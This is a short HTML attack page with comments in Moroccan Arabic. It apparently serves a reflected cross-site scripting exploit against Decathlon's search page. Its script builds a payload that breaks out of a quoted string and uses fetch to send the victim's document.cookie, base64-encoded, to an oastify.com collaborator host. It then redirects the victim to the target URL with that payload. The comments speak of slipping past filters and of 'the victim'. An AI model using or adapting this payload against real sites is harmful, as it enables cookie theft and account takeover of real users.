<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // هاد الكود كيحاول يهرب من الـ HTML Tags ويضرب الـ Javascript مباشرة
        // استعملنا encodeURIComponent باش الرموز بحال ' و ; يدوزو بلا ما يتبلوكاو في الطريق
        let payload = "';fetch('https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?c='+btoa(document.cookie));//";
        
        let encoded = encodeURIComponent(payload);
        
        // غادي يصيفط الضحية لـ Decathlon مع الـ Payload
        window.location.href = "https://www.decathlon.com/search?q=" + encoded;
    </script>
</body>
